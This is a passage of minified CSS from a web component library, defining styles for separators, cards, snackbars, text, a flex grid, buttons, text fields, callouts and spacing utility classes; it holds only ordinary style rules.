.bl-separator__line{position:absolute;top:50%;width:100%;z-index:1}.tfa-js .bl-separator__line-level-1{background:#ebebeb}.tfa-js .bl-separator__line-level-2{background:#e0e0e0}.tfa-js .bl-separator__content{background:#fff;padding:0 1em;position:relative;z-index:1}.tfa-js .bl-separator--center{-webkit-box-pack:center;-ms-flex-pack:center;justify-content:center}.tfa-js .bl-separator--left{-webkit-box-pack:start;-ms-flex-pack:start;justify-content:flex-start}.tfa-js .bl-separator--left .bl-separator__content{padding-left:0}.tfa-js .bl-separator--right{-webkit-box-pack:end;-ms-flex-pack:end;justify-content:flex-end}.tfa-js .bl-separator--right .bl-separator__content{padding-right:0}.tfa-js .bl-card{font-family:Hind Madurai,sans-serif;position:relative;display:block;background:#fff;max-width:100%;border-radius:4px;-webkit-box-shadow:0 2px 4px 0 rgba(0,0,0,0.12);box-shadow:0 2px 4px 0 rgba(0,0,0,0.12)}.tfa-js .bl-card--outlined{border:1px solid #c0c7d1;-webkit-box-shadow:none;box-shadow:none;border-radius:0}.tfa-js .bl-card--raised{-webkit-box-shadow:0 4px 12px 0 rgba(0,0,0,0.12);box-shadow:0 4px 12px 0 rgba(0,0,0,0.12);border-radius:8px}.tfa-js .bl-card.has-elevation-0{-webkit-box-shadow:none !important;box-shadow:none !important}.tfa-js .bl-card.has-elevation-1{-webkit-box-shadow:0 2px 4px 0 rgba(0,0,0,0.12);box-shadow:0 2px 4px 0 rgba(0,0,0,0.12)}.tfa-js .bl-snackbar{position:fixed;left:0;right:0;bottom:64px;margin:0 auto;width:480px;-webkit-box-align:center;-ms-flex-align:center;align-items:center;padding:12px 16px;color:#f2f2f2;border-radius:4px;-webkit-box-shadow:0 2px 10px 0 rgba(0,0,0,0.15);box-shadow:0 2px 10px 0 rgba(0,0,0,0.15);z-index:9999;-webkit-transition:all .5s cubic-bezier(.64,.04,.35,1);transition:all .5s cubic-bezier(.64,.04,.35,1)}.tfa-js .bl-snackbar.is-active{background-color:#030b14}.tfa-js .bl-snackbar.is-error{background-color:#cb0b04}.tfa-js .bl-snackbar__action-inline > a,.tfa-js .bl-snackbar__action-inline > div,.tfa-js .bl-snackbar__action-long > a,.tfa-js .bl-snackbar__action-long > div{float:right}.tfa-js .bl-snackbar__action-long{margin-top:16px}.tfa-js .bl-snackbar-animation-enter,.tfa-js .bl-snackbar-animation-leave-active{bottom:-999px}.tfa-js .bl-snackbar-animation-enter .bl-snackbar,.tfa-js .bl-snackbar-animation-leave-active .bl-snackbar{-webkit-transform:translateY(100%);transform:translateY(100%)}.tfa-js .bl-text{font-family:Hind Madurai,sans-serif;font-size:16px;line-height:1.25;color:#141414;margin:0}.tfa-js .bl-text--semi-bold{font-weight:600}.tfa-js .bl-text.bl-text--ellipsis__1{max-height:24px;-webkit-line-clamp:1}.tfa-js .bl-text.bl-text--ellipsis__1,.tfa-js .bl-text.bl-text--ellipsis__2{overflow:hidden;-webkit-box-orient:vertical;display:-webkit-box}.tfa-js .bl-text.bl-text--ellipsis__2{max-height:48px;-webkit-line-clamp:2}.tfa-js .bl-text.bl-text--ellipsis__3{max-height:72px;overflow:hidden;-webkit-box-orient:vertical;-webkit-line-clamp:3;display:-webkit-box}.tfa-js .bl-text--subheading-1{font-size:26px;line-height:1.23077}.tfa-js .bl-text--subheading-1.bl-text--ellipsis__1{max-height:39px;overflow:hidden;-webkit-box-orient:vertical;-webkit-line-clamp:1;display:-webkit-box}.tfa-js .bl-text--subheading-1.bl-text--ellipsis__2{max-height:78px;overflow:hidden;-webkit-box-orient:vertical;-webkit-line-clamp:2;display:-webkit-box}.tfa-js .bl-text--subheading-1.bl-text--ellipsis__3{max-height:117px;overflow:hidden;-webkit-box-orient:vertical;-webkit-line-clamp:3;display:-webkit-box}.tfa-js .bl-text--subheading-1.bl-text--ellipsis__1{word-break:break-all}.tfa-js .bl-text--subheading-2{font-size:20px;line-height:1.2}.tfa-js .bl-text--subheading-2.bl-text--ellipsis__1{max-height:30px;overflow:hidden;-webkit-box-orient:vertical;-webkit-line-clamp:1;display:-webkit-box}.tfa-js .bl-text--subheading-2.bl-text--ellipsis__2{max-height:60px;overflow:hidden;-webkit-box-orient:vertical;-webkit-line-clamp:2;display:-webkit-box}.tfa-js .bl-text--subheading-2.bl-text--ellipsis__3{max-height:90px;overflow:hidden;-webkit-box-orient:vertical;-webkit-line-clamp:3;display:-webkit-box}.tfa-js .bl-text--subheading-2.bl-text--ellipsis__1{word-break:break-all}.tfa-js .bl-text--subheading-3{font-size:18px;line-height:1.33333}.tfa-js .bl-text--subheading-3.bl-text--ellipsis__1{max-height:27px;overflow:hidden;-webkit-box-orient:vertical;-webkit-line-clamp:1;display:-webkit-box}.tfa-js .bl-text--subheading-3.bl-text--ellipsis__2{max-height:54px;overflow:hidden;-webkit-box-orient:vertical;-webkit-line-clamp:2;display:-webkit-box}.tfa-js .bl-text--subheading-3.bl-text--ellipsis__3{max-height:81px;overflow:hidden;-webkit-box-orient:vertical;-webkit-line-clamp:3;display:-webkit-box}.tfa-js .bl-text--subheading-3.bl-text--ellipsis__1{word-break:break-all}.tfa-js .bl-text--body-default{font-size:16px;line-height:1.25}.tfa-js .bl-text--body-default.bl-text--ellipsis__1{max-height:24px;overflow:hidden;-webkit-box-orient:vertical;-webkit-line-clamp:1;display:-webkit-box}.tfa-js .bl-text--body-default.bl-text--ellipsis__2{max-height:48px;overflow:hidden;-webkit-box-orient:vertical;-webkit-line-clamp:2;display:-webkit-box}.tfa-js .bl-text--body-default.bl-text--ellipsis__3{max-height:72px;overflow:hidden;-webkit-box-orient:vertical;-webkit-line-clamp:3;display:-webkit-box}.tfa-js .bl-text--body-default.bl-text--ellipsis__1{word-break:break-all}.tfa-js .bl-text--body-small{font-size:14px;line-height:1.46429}.tfa-js .bl-text--body-small.bl-text--ellipsis__1{max-height:21px;overflow:hidden;-webkit-box-orient:vertical;-webkit-line-clamp:1;display:-webkit-box}.tfa-js .bl-text--body-small.bl-text--ellipsis__2{max-height:42px;overflow:hidden;-webkit-box-orient:vertical;-webkit-line-clamp:2;display:-webkit-box}.tfa-js .bl-text--body-small.bl-text--ellipsis__3{max-height:63px;overflow:hidden;-webkit-box-orient:vertical;-webkit-line-clamp:3;display:-webkit-box}.tfa-js .bl-text--body-small.bl-text--ellipsis__1{word-break:break-all}.tfa-js .bl-text--caption{font-size:13px;line-height:1.23077}.tfa-js .bl-text--caption.bl-text--ellipsis__1{max-height:19.5px;overflow:hidden;-webkit-box-orient:vertical;-webkit-line-clamp:1;display:-webkit-box}.tfa-js .bl-text--caption.bl-text--ellipsis__2{max-height:39px;overflow:hidden;-webkit-box-orient:vertical;-webkit-line-clamp:2;display:-webkit-box}.tfa-js .bl-text--caption.bl-text--ellipsis__3{max-height:58.5px;overflow:hidden;-webkit-box-orient:vertical;-webkit-line-clamp:3;display:-webkit-box}.tfa-js .bl-text--caption.bl-text--ellipsis__1{word-break:break-all}.tfa-js .bl-text--overline{font-size:11px;line-height:1.45455;letter-spacing:1.2px;text-transform:uppercase}.tfa-js .bl-text--overline.bl-text--ellipsis__1{max-height:16.5px;overflow:hidden;-webkit-box-orient:vertical;-webkit-line-clamp:1;display:-webkit-box}.tfa-js .bl-text--overline.bl-text--ellipsis__2{max-height:33px;overflow:hidden;-webkit-box-orient:vertical;-webkit-line-clamp:2;display:-webkit-box}.tfa-js .bl-text--overline.bl-text--ellipsis__3{max-height:49.5px;overflow:hidden;-webkit-box-orient:vertical;-webkit-line-clamp:3;display:-webkit-box}.tfa-js .bl-text--overline.bl-text--ellipsis__1{word-break:break-all}.tfa-js .bl-text--left{text-align:left}.tfa-js .bl-text--center{text-align:center}.tfa-js .bl-text--right{text-align:right}.tfa-js .bl-text--disabled{color:#d6d6d6;cursor:not-allowed}.tfa-js .bl-text--subdued{color:#8d8d8d}.tfa-js .bl-text--uppercase{text-transform:uppercase}.tfa-js .bl-text--inverse{color:#f2f2f2}.tfa-js .bl-text--error{color:#e60505}.tfa-js .bl-flex-item.is-col-0{width:0;-webkit-box-flex:1;-ms-flex:1 0 0%;flex:1 0 0%;max-width:0}.tfa-js .bl-flex-item.is-offset-0{-ms-flex-preferred-size:0;flex-basis:0;-webkit-box-flex:1;-ms-flex-positive:1;flex-grow:1;margin-left:0}.tfa-js .bl-flex-item.is-col-1{width:8.33333%;-webkit-box-flex:1;-ms-flex:1 0 8.33333%;flex:1 0 8.33333%;max-width:8.33333%}.tfa-js .bl-flex-item.is-offset-1{-ms-flex-preferred-size:0;flex-basis:0;-webkit-box-flex:1;-ms-flex-positive:1;flex-grow:1;margin-left:8.33333%}.tfa-js .bl-flex-item.is-col-2{width:16.66667%;-webkit-box-flex:1;-ms-flex:1 0 16.66667%;flex:1 0 16.66667%;max-width:16.66667%}.tfa-js .bl-flex-item.is-offset-2{-ms-flex-preferred-size:0;flex-basis:0;-webkit-box-flex:1;-ms-flex-positive:1;flex-grow:1;margin-left:16.66667%}.tfa-js .bl-flex-item.is-col-3{width:25%;-webkit-box-flex:1;-ms-flex:1 0 25%;flex:1 0 25%;max-width:25%}.tfa-js .bl-flex-item.is-offset-3{-ms-flex-preferred-size:0;flex-basis:0;-webkit-box-flex:1;-ms-flex-positive:1;flex-grow:1;margin-left:25%}.tfa-js .bl-flex-item.is-col-4{width:33.33333%;-webkit-box-flex:1;-ms-flex:1 0 33.33333%;flex:1 0 33.33333%;max-width:33.33333%}.tfa-js .bl-flex-item.is-offset-4{-ms-flex-preferred-size:0;flex-basis:0;-webkit-box-flex:1;-ms-flex-positive:1;flex-grow:1;margin-left:33.33333%}.tfa-js .bl-flex-item.is-col-5{width:41.66667%;-webkit-box-flex:1;-ms-flex:1 0 41.66667%;flex:1 0 41.66667%;max-width:41.66667%}.tfa-js .bl-flex-item.is-offset-5{-ms-flex-preferred-size:0;flex-basis:0;-webkit-box-flex:1;-ms-flex-positive:1;flex-grow:1;margin-left:41.66667%}.tfa-js .bl-flex-item.is-col-6{width:50%;-webkit-box-flex:1;-ms-flex:1 0 50%;flex:1 0 50%;max-width:50%}.tfa-js .bl-flex-item.is-offset-6{-ms-flex-preferred-size:0;flex-basis:0;-webkit-box-flex:1;-ms-flex-positive:1;flex-grow:1;margin-left:50%}.tfa-js .bl-flex-item.is-col-7{width:58.33333%;-webkit-box-flex:1;-ms-flex:1 0 58.33333%;flex:1 0 58.33333%;max-width:58.33333%}.tfa-js .bl-flex-item.is-offset-7{-ms-flex-preferred-size:0;flex-basis:0;-webkit-box-flex:1;-ms-flex-positive:1;flex-grow:1;margin-left:58.33333%}.tfa-js .bl-flex-item.is-col-8{width:66.66667%;-webkit-box-flex:1;-ms-flex:1 0 66.66667%;flex:1 0 66.66667%;max-width:66.66667%}.tfa-js .bl-flex-item.is-offset-8{-ms-flex-preferred-size:0;flex-basis:0;-webkit-box-flex:1;-ms-flex-positive:1;flex-grow:1;margin-left:66.66667%}.tfa-js .bl-flex-item.is-col-9{width:75%;-webkit-box-flex:1;-ms-flex:1 0 75%;flex:1 0 75%;max-width:75%}.tfa-js .bl-flex-item.is-offset-9{-ms-flex-preferred-size:0;flex-basis:0;-webkit-box-flex:1;-ms-flex-positive:1;flex-grow:1;margin-left:75%}.tfa-js .bl-flex-item.is-col-10{width:83.33333%;-webkit-box-flex:1;-ms-flex:1 0 83.33333%;flex:1 0 83.33333%;max-width:83.33333%}.tfa-js .bl-flex-item.is-offset-10{-ms-flex-preferred-size:0;flex-basis:0;-webkit-box-flex:1;-ms-flex-positive:1;flex-grow:1;margin-left:83.33333%}.tfa-js .bl-flex-item.is-col-11{width:91.66667%;-webkit-box-flex:1;-ms-flex:1 0 91.66667%;flex:1 0 91.66667%;max-width:91.66667%}.tfa-js .bl-flex-item.is-offset-11{-ms-flex-preferred-size:0;flex-basis:0;-webkit-box-flex:1;-ms-flex-positive:1;flex-grow:1;margin-left:91.66667%}.tfa-js .bl-flex-item.is-col-12{width:100%;-webkit-box-flex:1;-ms-flex:1 0 100%;flex:1 0 100%;max-width:100%}.tfa-js .bl-flex-item.is-offset-12{-ms-flex-preferred-size:0;flex-basis:0;-webkit-box-flex:1;-ms-flex-positive:1;flex-grow:1;margin-left:100%}.tfa-js .bl-flex-container{display:-webkit-box;display:-ms-flexbox;display:flex}.tfa-js .bl-flex-container:not(:last-child){margin-bottom:1.5rem}.tfa-js .bl-flex-container:last-child{margin-bottom:0}.tfa-js .bl-flex-container.is-gutter-16{margin-left:-8px;margin-right:-8px;margin-top:-8px}.tfa-js .bl-flex-container.is-gutter-16 > .bl-flex-item{padding:8px}.tfa-js .bl-flex-container.is-gutter-16:last-child{margin-bottom:-8px}.tfa-js .bl-flex-container.is-gutter-16:not(:last-child){margin-bottom:calc(1.5rem - 8px)}.tfa-js .bl-flex-container.is-gutter-20{margin-left:-10px;margin-right:-10px;margin-top:-10px}.tfa-js .bl-flex-container.is-gutter-20 > .bl-flex-item{padding:10px}.tfa-js .bl-flex-container.is-gutter-20:last-child{margin-bottom:-10px}.tfa-js .bl-flex-container.is-gutter-20:not(:last-child){margin-bottom:calc(1.5rem - 10px)}.tfa-js .bl-flex-container.is-gutter-24{margin-left:-12px;margin-right:-12px;margin-top:-12px}.tfa-js .bl-flex-container.is-gutter-24 > .bl-flex-item{padding:12px}.tfa-js .bl-flex-container.is-gutter-24:last-child{margin-bottom:-12px}.tfa-js .bl-flex-container.is-gutter-24:not(:last-child){margin-bottom:calc(1.5rem - 12px)}.tfa-js .bl-flex-container.is-gutter-32{margin-left:-16px;margin-right:-16px;margin-top:-16px}.tfa-js .bl-flex-container.is-gutter-32 > .bl-flex-item{padding:16px}.tfa-js .bl-flex-container.is-gutter-32:last-child{margin-bottom:-16px}.tfa-js .bl-flex-container.is-gutter-32:not(:last-child){margin-bottom:calc(1.5rem - 16px)}.tfa-js .bl-button{position:relative;display:-webkit-inline-box;display:-ms-inline-flexbox;display:inline-flex;-webkit-box-orient:horizontal;-webkit-box-direction:normal;-ms-flex-direction:row;flex-direction:row;-webkit-box-pack:center;-ms-flex-pack:center;justify-content:center;-webkit-box-align:center;-ms-flex-align:center;align-items:center;border-radius:4px;border:none;cursor:pointer;-webkit-transition:all .3s cubic-bezier(.64,.05,.35,1);transition:all .3s cubic-bezier(.64,.05,.35,1)}.tfa-js .bl-button:focus{outline:none}.tfa-js .bl-button:before{content:""}.tfa-js .bl-button--loading{position:absolute;display:-webkit-box;display:-ms-flexbox;display:flex;-webkit-box-orient:horizontal;-webkit-box-direction:normal;-ms-flex-direction:row;flex-direction:row;-webkit-box-pack:center;-ms-flex-pack:center;justify-content:center;-webkit-box-align:center;-ms-flex-align:center;align-items:center}.tfa-js .bl-button--large{height:52px;padding:0 28px}.tfa-js .bl-button--medium{height:44px;padding:0 28px}.tfa-js .bl-button--small{height:36px;padding:0 28px}.tfa-js .bl-button--extra-small{width:32px;height:32px}.tfa-js .bl-button--primary{border:2px solid #e31f52;background:#e31f52}.tfa-js .bl-button--primary:not(.is-disabled):hover{border:2px solid #b3002d;background:#b3002d;-webkit-box-shadow:none;box-shadow:none}.tfa-js .bl-button--primary:not(.is-disabled):active{border:2px solid #5d0011;background:#5d0011;-webkit-box-shadow:none;box-shadow:none}.tfa-js .bl-button--primary:focus{border:2px solid #04f;-webkit-box-shadow:inset 0 0 0 2px #fff;box-shadow:inset 0 0 0 2px #fff}.tfa-js .bl-button--primary.is-disabled{opacity:.6;cursor:not-allowed}.tfa-js .bl-button--outline{border:2px solid #5e5e5e;background:#fff}.tfa-js .bl-button--outline .svg-icon path{fill:#141414}.tfa-js .bl-button--outline:not(.is-disabled):hover{background:#f2f2f2}.tfa-js .bl-button--outline:not(.is-disabled):active{background:#ebebeb}.tfa-js .bl-button--outline:focus{border:2px solid #04f}.tfa-js .bl-button--outline.is-disabled{border:2px solid #e0e0e0;opacity:.8;cursor:not-allowed}.tfa-js .bl-button--outline.is-disabled .svg-icon path{fill:#e0e0e0}.tfa-js .bl-button--outline-expressive{border:2px solid #5e5e5e;background:#fff;-webkit-transition:all .1s cubic-bezier(.75,.05,.85,.06);transition:all .1s cubic-bezier(.75,.05,.85,.06)}.tfa-js .bl-button--outline-expressive .svg-icon path{fill:#141414}.tfa-js .bl-button--outline-expressive:not(.is-disabled):hover{background:#5e5e5e;border:2px solid #5e5e5e;-webkit-box-shadow:none;box-shadow:none}.tfa-js .bl-button--outline-expressive:not(.is-disabled):hover .bl-text{color:#fff}.tfa-js .bl-button--outline-expressive:not(.is-disabled):hover .svg-icon path{fill:#fff}.tfa-js .bl-button--outline-expressive:not(.is-disabled):active{border:2px solid #3d3d3d;background:#3d3d3d;-webkit-box-shadow:none;box-shadow:none}.tfa-js .bl-button--outline-expressive:not(.is-disabled):active .bl-text{color:#fff}.tfa-js .bl-button--outline-expressive:focus{border:2px solid #04f;background:#5e5e5e;-webkit-box-shadow:inset 0 0 0 2px #fff;box-shadow:inset 0 0 0 2px #fff}.tfa-js .bl-button--outline-expressive:focus .bl-text{color:#fff}.tfa-js .bl-button--outline-expressive.is-disabled{border:2px solid #e0e0e0;opacity:.8;cursor:not-allowed}.tfa-js .bl-button--outline-expressive.is-disabled .svg-icon path{fill:#e0e0e0}.tfa-js .bl-button--ghost{border:2px solid transparent;background:transparent}.tfa-js .bl-button--ghost .svg-icon path{fill:#141414}.tfa-js .bl-button--ghost:not(.is-disabled):hover{border:2px solid #f2f2f2;background:#f2f2f2}.tfa-js .bl-button--ghost:not(.is-disabled):active{border:2px solid #ebebeb;background:#ebebeb}.tfa-js .bl-button--ghost:focus{border:2px solid #04f}.tfa-js .bl-button--ghost.is-disabled{opacity:.8;cursor:not-allowed}.tfa-js .bl-button--ghost.is-disabled .svg-icon path{fill:#e0e0e0}.tfa-js .bl-button--destructive{border:2px solid #f42c2c;background:#f42c2c}.tfa-js .bl-button--destructive:not(.is-disabled):hover{border:2px solid #e60505;background:#e60505;-webkit-box-shadow:none;box-shadow:none}.tfa-js .bl-button--destructive:not(.is-disabled):active{border:2px solid #ac0802;background:#ac0802;-webkit-box-shadow:none;box-shadow:none}.tfa-js .bl-button--destructive:focus{border:2px solid #04f;-webkit-box-shadow:inset 0 0 0 2px #fff;box-shadow:inset 0 0 0 2px #fff}.tfa-js .bl-button--destructive.is-disabled{opacity:.6;cursor:not-allowed}.tfa-js .bl-button__has-icon{margin-left:12px;margin-right:-4px;display:-webkit-box;display:-ms-flexbox;display:flex;-webkit-box-orient:horizontal;-webkit-box-direction:normal;-ms-flex-direction:row;flex-direction:row;-webkit-box-pack:center;-ms-flex-pack:center;justify-content:center;-webkit-box-align:center;-ms-flex-align:center;align-items:center}.tfa-js .is-icon-only{padding:0}.tfa-js .is-icon-only .bl-button__has-icon{margin-left:0;margin-right:0}.tfa-js .bl-button.is-icon-only.bl-button--large{width:52px}.tfa-js .bl-button.is-icon-only.bl-button--medium{width:44px}.tfa-js .bl-button.is-icon-only.bl-button--small{width:36px}.tfa-js .bl-button.bl-button--block{width:100%}.tfa-js .bl-text-field{font-family:Hind Madurai,sans-serif;position:relative;display:inline-block;width:100%;max-width:100%;font-size:16px}.tfa-js .bl-text-field:before{content:"";border:1px solid #c0c7d1;border-radius:4px;position:absolute;top:0;width:100%;height:52px;display:block;-webkit-transition:border,border-width .08s cubic-bezier(.55,.085,.68,.53);transition:border,border-width .08s cubic-bezier(.55,.085,.68,.53)}.tfa-js .bl-text-field__boxed{background:#fff;border-radius:4px;display:-webkit-inline-box;display:-ms-inline-flexbox;display:inline-flex;width:inherit;height:52px;cursor:text}.tfa-js .bl-text-field__boxed,.tfa-js .bl-text-field__inner{-webkit-box-align:center;-ms-flex-align:center;align-items:center}.tfa-js .bl-text-field__inner{position:relative;display:-webkit-box;display:-ms-flexbox;display:flex;height:100%;margin:0 12px;width:100%}.tfa-js .bl-text-field__input{border:none;display:block;font-family:inherit;margin:20px 0 0;width:100%;background:none;text-align:left;color:#141414;font-size:inherit;min-height:auto;padding:0;-moz-appearance:textfield}.tfa-js .bl-text-field__input::-webkit-inner-spin-button,.tfa-js .bl-text-field__input::-webkit-outer-spin-button{-webkit-appearance:none;margin:0}.tfa-js .bl-text-field__input::-webkit-credentials-auto-fill-button{visibility:hidden}.tfa-js .bl-text-field__input::-webkit-input-placeholder{color:#8d8d8d}.tfa-js .bl-text-field__input::-moz-placeholder{color:#8d8d8d}.tfa-js .bl-text-field__input:-ms-input-placeholder{color:#8d8d8d}.tfa-js .bl-text-field__input::-ms-input-placeholder{color:#8d8d8d}.tfa-js .bl-text-field__input::placeholder{color:#8d8d8d}.tfa-js .bl-text-field__input:focus{outline:none;-webkit-box-shadow:none;box-shadow:none}.tfa-js .bl-text-field__label{color:#8d8d8d;font-size:16px;display:block;position:absolute;top:16px;overflow:hidden;white-space:nowrap;pointer-events:none;height:20px;line-height:20px;-webkit-transition:.3s cubic-bezier(.25,.8,.5,1);transition:.3s cubic-bezier(.25,.8,.5,1)}.tfa-js .bl-text-field__message{margin-top:4px;margin-right:8px;display:-webkit-box;display:-ms-flexbox;display:flex;-webkit-box-align:start;-ms-flex-align:start;align-items:flex-start}.tfa-js .bl-text-field__message svg{width:13px !important;height:13px !important;margin-top:1px;margin-right:4px;-ms-flex-negative:0;flex-shrink:0}.tfa-js .bl-text-field__counter{-ms-flex-negative:0;flex-shrink:0;margin-top:4px}.tfa-js .bl-text-field__counter.is-invisible{display:none}.tfa-js .bl-text-field__prefix,.tfa-js .bl-text-field__suffix{display:-webkit-inline-box;display:-ms-inline-flexbox;display:inline-flex}.tfa-js .bl-text-field__prefix svg,.tfa-js .bl-text-field__suffix svg{width:20px;height:20px}.tfa-js .bl-text-field__prefix svg path,.tfa-js .bl-text-field__suffix svg path{fill:#484e5c}.tfa-js .bl-text-field__prefix{margin-left:12px;margin-right:-4px}.tfa-js .bl-text-field__suffix{z-index:1;margin-right:12px}.tfa-js .bl-text-field__append,.tfa-js .bl-text-field__prepend{color:#8d8d8d;z-index:1}.tfa-js .bl-text-field__prepend{margin-left:12px}.tfa-js .bl-text-field__append{margin-right:12px}.tfa-js .bl-text-field.has-value .bl-text-field__label,.tfa-js .bl-text-field.is-focused .bl-text-field__label{top:8px;font-size:13px;height:16px;line-height:16px}.tfa-js .bl-text-field.is-focused:before{border:2px solid #3a5fd6}.tfa-js .bl-text-field.is-error:before{border:2px solid #cb0b04}.tfa-js .bl-text-field.is-disabled:before{border-color:#e0e0e0;background:#f2f2f2}.tfa-js .bl-text-field.is-disabled .bl-text-field__input{color:#8d8d8d}.tfa-js .bl-text-field.is-disabled .bl-text-field__label{color:#d6d6d6}.tfa-js .bl-text-field.is-disabled .bl-text-field__boxed{cursor:not-allowed}.tfa-js .bl-text-field.is-disabled .bl-text-field__append,.tfa-js .bl-text-field.is-disabled .bl-text-field__prepend{color:#d6d6d6}.tfa-js .bl-text-field--inline .bl-text-field__label{display:none}.tfa-js .bl-text-field--inline .bl-text-field__input{margin-top:0}.tfa-js .bl-text-field--inline.bl-text-field--small{font-size:14px}.tfa-js .bl-text-field--inline.bl-text-field--small .bl-text-field__boxed,.tfa-js .bl-text-field--inline.bl-text-field--small:before{height:32px}.tfa-js .bl-text-field--inline.bl-text-field--small .bl-text-field__input{letter-spacing:.18px}.tfa-js .bl-text-field--inline.bl-text-field--small .bl-text-field__inner{margin:0 8px}.tfa-js .bl-text-field--inline.bl-text-field--small .bl-text-field__prepend{margin-left:8px;margin-right:-4px}.tfa-js .bl-text-field--inline.bl-text-field--small .bl-text-field__append{margin-right:8px;margin-left:-4px}.tfa-js .bl-callout{display:block;border-radius:4px;border:2px solid #8d8d8d;background-color:#f7f7f7}.tfa-js .bl-callout__icon-left{line-height:0}.tfa-js .bl-callout--medium{background-color:#edf3f7;border-color:#348ad6}.tfa-js .bl-callout--high{background-color:#fff2e0;border-color:#fc9b0a}.tfa-js .bl-callout--danger{background-color:#ffd4d6;border-color:#ec0c0c}.tfa-js .bl-callout--safe{background-color:#ddf6dd;border-color:#23a665}.tfa-js .p-0{padding:0 !important}.tfa-js .p-4{padding:4px !important}.tfa-js .p-8{padding:8px !important}.tfa-js .p-12{padding:12px !important}.tfa-js .p-16{padding:16px !important}.tfa-js .p-20{padding:20px !important}.tfa-js .p-24{padding:24px !important}.tfa-js .p-32{padding:32px !important}.tfa-js .p-48{padding:48px !important}.tfa-js .p-64{padding:64px !important}.tfa-js .pt-0{padding-top:0 !important}.tfa-js .pt-4{padding-top:4px !important}.tfa-js .pt-8{padding-top:8px !important}.tfa-js .pt-12{padding-top:12px !important}.tfa-js .pt-16{padding-top:16px !important}.tfa-js .pt-20{padding-top:20px !important}.tfa-js .pt-24{padding-top:24px !important}.tfa-js .pt-32{padding-top:32px !important}.tfa-js .pt-48{padding-top:48px !important}.tfa-js .pt-64{padding-top:64px !important}.tfa-js .pr-0{padding-right:0 !important}.tfa-js .pr-4{padding-right:4px !important}.tfa-js .pr-8{padding-right:8px !important}.tfa-js .pr-12{padding-right:12px !important}.tfa-js .pr-16{padding-right:16px !important}.tfa-js .pr-20{padding-right:20px !important}.tfa-js .pr-24{padding-right:24px !important}.tfa-js .pr-32{padding-right:32px !important}.tfa-js .pr-48{padding-right:48px !important}.tfa-js .pr-64{padding-right:64px !important}.tfa-js .pb-0{padding-bottom:0 !important}.tfa-js .pb-4{padding-bottom:4px !important}.tfa-js .pb-8{padding-bottom:8px !important}.tfa-js .pb-12{padding-bottom:12px !important}.tfa-js .pb-16{padding-bottom:16px !important}.tfa-js .pb-20{padding-bottom:20px !important}.tfa-js .pb-24{padding-bottom:24px !important}.tfa-js .pb-32{padding-bottom:32px !important}.tfa-js .pb-48{padding-bottom:48px !important}.tfa-js .pb-64{padding-bottom:64px !important}.tfa-js .pl-0{padding-left:0 !important}.tfa-js .pl-4{padding-left:4px !important}.tfa-js .pl-8{padding-left:8px !important}.tfa-js .pl-12{padding-left:12px !important}.tfa-js .pl-16{padding-left:16px !important}.tfa-js .pl-20{padding-left:20px !important}.tfa-js .pl-24{padding-left:24px !important}.tfa-js .pl-32{padding-left:32px !important}.tfa-js .pl-48{padding-left:48px !important}.tfa-js .pl-64{padding-left:64px !important}.tfa-js .m-0{margin:0 !important}.tfa-js .m-4{margin:4px !important}.tfa-js .m-8{margin:8px !important}.tfa-js .m-12{margin:12px !important}.tfa-js .m-16{margin:16px !important}.tfa-js .m-20{margin:20px !important}.tfa-js .m-24{margin:24px !important}.tfa-js .m-32{margin:32px !important}.tfa-js .m-48{margin:48px !important}.tfa-js .m-64{margin:64px !important}.tfa-js .mt-0{margin-top:0 !important}.tfa-js .mt-4{margin-top:4px !important}.tfa-js .mt-8{margin-top:8px !important}.tfa-js .mt-12{margin-top:12px !important}.tfa-js .mt-16{margin-top:16px !important}.tfa-js .mt-20{margin-top:20px !important}.tfa-js .mt-24{margin-top:24px !important}.tfa-js .mt-32{margin-top:32px !important}.tfa-js .mt-48{margin-top:48px !important}.tfa-js .mt-64{margin-top:64px !important}.tfa-js .mr-0{margin-right:0 !important}.tfa-js .mr-4{margin-right:4px !important}.tfa-js .mr-8{margin-right:8px !important}.tfa-js .mr-12{margin-right:12px !important}.tfa-js .mr-16{margin-right:16px !important}.tfa-js .mr-20{margin-right:20px !important}.tfa-js .mr-24{margin-right:24px !important}.tfa-js .mr-32{margin-right:32px !important}.tfa-js .mr-48{margin-right:48px !important}.tfa-js .mr-64{margin-right:64px !important}.tfa-js .mb-0{margin-bottom:0 !important}.tfa-js .mb-4{margin-bottom:4px !important}.tfa-js .mb-8{margin-bottom:8px !important}.tfa-js .mb-12{margin-bottom:12px !important}.tfa-js .mb-16{margin-bottom:16px !important}.tfa-js .mb-20{margin-bottom:20px !important}.tfa-js .mb-24{margin-bottom:24px !important}.tfa-js .mb-32{margin-bottom:32px !important}.tfa-js .mb-48{margin-bottom:48px !important}.tfa-js .mb-64{margin-bottom:64px !important}.tfa-js .ml-0{margin-left:0 !important}.tfa-js .mv-0{margin-top:0 !important;margin-bottom:0 !important}.tfa-js .pv-0{padding-top:0 !important;padding-bottom:0 !important}.tfa-js .mh-0{margin-left:0 !important;margin-right:0 !important}.tfa-js .ph-0{padding-left:0 !important;padding-right:0 !important}.tfa-js .ml-4{margin-left:4px !important}.tfa-js .mv-4{margin-top:4px !important;margin-bottom:4px !important}.tfa-js .pv-4{padding-top:4px !important;padding-bottom:4px !important}.tfa-js .mh-4{margin-left:4px !important;margin-right:4px !important}.tfa-js .ph-4{padding-left:4px !important;padding-right:4px !important}.tfa-js .ml-8{margin-left:8px !important}.tfa-js .mv-8{margin-top:8px !important;margin-bottom:8px !important}.tfa-js .pv-8{padding-top:8px !important;padding-bottom:8px !important}.tfa-js .mh-8{margin-left:8px !important;margin-right:8px !important}.tfa-js .ph-8{padding-left:8px !important;padding-right:8px !important}.tfa-js .ml-12{margin-left:12px !important}.tfa-js .mv-12{margin-top:12px !important;margin-bottom:12px !important}.tfa-js .pv-12{padding-top:12px !important;padding-bottom:12px !important}.tfa-js .mh-12{margin-left:12px !important;margin-right:12px !important}.tfa-js .ph-12{padding-left:12px !important;padding-right:12px !important}.tfa-js .ml-16{margin-left:16px !important}.tfa-js .mv-16{margin-top:16px !important;margin-bottom:16px !important}.tfa-js .pv-16{padding-top:16px !important;padding-bottom:16px !important}.tfa-js .mh-16{margin-left:16px !important;margin-right:16px !important}.tfa-js .ph-16{padding-left:16px !important;padding-right:16px !important}.tfa-js .ml-20{margin-left:20px !important}.tfa-js .mv-20{margin-top:20px !important;margin-bottom:20px !important}.tfa-js .pv-20{padding-top:20px !important;padding-bottom:20px !important}.tfa-js .mh-20{margin-left:20px !important;margin-right:20px !important}.tfa-js .ph-20{padding-left:20px !important;padding-right:20px !important}.tfa-js .ml-24{margin-left:24px !important}.tfa-js 